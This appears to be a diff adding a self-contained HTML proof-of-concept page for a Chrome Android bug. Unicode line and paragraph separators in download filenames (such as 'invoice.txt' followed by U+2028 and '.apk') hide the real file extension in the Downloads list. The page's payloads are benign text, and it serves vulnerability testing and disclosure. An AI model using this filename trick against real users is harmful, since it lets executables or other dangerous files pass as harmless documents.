@@ -1,0 +1,136 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>U+2028 line-separator filename bypass — Chrome Android</title>
+<style>
+  :root { color-scheme: light dark; }
+  body { font-family: system-ui, sans-serif; margin: 1.2rem; line-height: 1.5; max-width: 46rem; }
+  h1 { font-size: 1.35rem; }
+  h2 { font-size: 1.05rem; margin-top: 1.5rem; }
+  button { font: inherit; padding: .7rem 1rem; margin: .3rem .3rem .3rem 0;
+           border: 1px solid #888; border-radius: .55rem; background: #f4f4f4; color: #111; }
+  button:active { background: #ddd; }
+  pre { background: #f0f0f0; color: #111; padding: .75rem; border-radius: .45rem;
+        white-space: pre-wrap; word-break: break-all; }
+  code { font-family: ui-monospace, monospace; }
+  .note { background: #fff8dc; color: #111; padding: .75rem; border-radius: .45rem; }
+  table { border-collapse: collapse; width: 100%; }
+  th, td { border: 1px solid #bbb; padding: .35rem .45rem; text-align: left; vertical-align: top; }
+  .small { color: #666; font-size: .92em; }
+</style>
+</head>
+<body>
+<h1>U+2028 line-separator filename bypass — Chrome Android</h1>
+
+<p>
+  Each button downloads a tiny <b>plain-text</b> payload. The filename is the only thing under
+  test. Open <b>Chrome &rarr; Downloads</b> after each download and look at the item title.
+</p>
+
+<h2>1. Baseline</h2>
+<div><button onclick="dl('normal')">Normal (long ASCII .txt)</button></div>
+<div><button onclick="dl('longTxt')">215-char .txt</button></div>
+
+<h2>2. New: U+2028 / U+2029 line-separator bypass</h2>
+<div><button onclick="dl('sepPdf')">invoice.txt + U+2028 + .pdf (no warning)</button></div>
+<div><button onclick="dl('sepApk')">invoice.txt + U+2028 + .apk (may warn)</button></div>
+<div><button onclick="dl('sepApk2029')">invoice.txt + U+2029 + .apk (alternate)</button></div>
+
+<pre id="log">No download triggered yet.</pre>
+
+<h2>What to look for</h2>
+<table>
+  <tr><th>Button</th><th>Real filename</th><th>Bug visible if…</th></tr>
+  <tr>
+    <td>Normal</td>
+    <td>long ASCII <code>harmless…​.txt</code></td>
+    <td>it shows <code>…​.txt</code> (baseline sanity check)</td>
+  </tr>
+  <tr>
+    <td>215-char .txt</td>
+    <td>211 × <code>a</code> + <code>.txt</code></td>
+    <td>title shows <code>aaaa…</code> and <b>no .txt</b></td>
+  </tr>
+  <tr>
+    <td>U+2028 + .pdf</td>
+    <td><code>invoice.txt</code> + U+2028 + <code>.pdf</code></td>
+    <td>title shows <b>invoice.txt</b> only; the real <b>.pdf</b> is on the hidden second line</td>
+  </tr>
+  <tr>
+    <td>U+2028 + .apk</td>
+    <td><code>invoice.txt</code> + U+2028 + <code>.apk</code></td>
+    <td>title shows <b>invoice.txt</b>; the real <b>.apk</b> is hidden (Chrome may warn because the real extension is .apk)</td>
+  </tr>
+  <tr>
+    <td>U+2029 + .apk</td>
+    <td><code>invoice.txt</code> + U+2029 + <code>.apk</code></td>
+    <td>same, using PARAGRAPH SEPARATOR instead of LINE SEPARATOR</td>
+  </tr>
+</table>
+
+<p class="note">
+  <b>Bug:</b> U+2028 is Unicode category <b>Zl</b> and U+2029 is <b>Zp</b>. Chrome's filename
+  sanitizer replaces <code>Cc</code>/<code>Cf</code> but not <code>Zl</code>/<code>Zp</code>, so the
+  character survives. Android's single-line Downloads title treats it as a mandatory line break:
+  the first line (<code>invoice.txt</code>) is shown, the real extension on the second line is
+  hidden.
+</p>
+
+<p class="note">
+  <b>Not a bug if:</b> the title shows <code>invoice.txt .pdf</code> / <code>invoice.txt .apk</code>
+  (the separator was replaced with a space), or both lines are visible. In that case the candidate
+  is not exploitable on your build.
+</p>
+
+<p class="note">
+  <b>Hosting:</b> this file is self-contained. Upload it to GitHub Pages (or any static host) and
+  open it in Chrome Android. The payload is plain text; nothing executes. For the
+  Content-Disposition variant (instead of the <code>download</code> attribute), use
+  <code>poc_server.py</code> endpoints <code>/f3</code>, <code>/f3b</code>, <code>/f3c/…</code>.
+</p>
+
+<p class="note">
+  <b>Evidence to capture:</b> a screenshot/screen recording of the Downloads screen for Normal,
+  U+2028 + .pdf, and U+2028 + .apk, plus the Chrome version (Settings &rarr; About Chrome) and the
+  device model. If possible, show the saved filename in a terminal:
+  <code>ls -b /sdcard/Download</code>.
+</p>
+
+<script>
+  const A = 'a'.repeat(211);
+
+  const cases = {
+    normal:      { name: 'harmless' + 's'.repeat(126) + '.txt' },
+    longTxt:     { name: A + '.txt' },
+    sepPdf:      { name: 'invoice.txt\u2028.pdf' },
+    sepApk:      { name: 'invoice.txt\u2028.apk' },
+    sepApk2029:  { name: 'invoice.txt\u2029.apk' },
+  };
+
+  function dl(key) {
+    const c = cases[key];
+    const blob = new Blob(['benign test payload'], { type: 'text/plain' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = c.name;
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+    setTimeout(() => URL.revokeObjectURL(url), 10000);
+
+    const shown = c.name
+      .replace(/\u2028/g, '[U+2028]')
+      .replace(/\u2029/g, '[U+2029]');
+
+    document.getElementById('log').textContent =
+      'Triggered: ' + key + '\n' +
+      'length: ' + c.name.length + ' UTF-16 code units\n' +
+      'download attribute: ' + shown + '\n\n' +
+      'Open Chrome -> Downloads and check the ending.';
+  }
+</script>
+</body>
+</html>
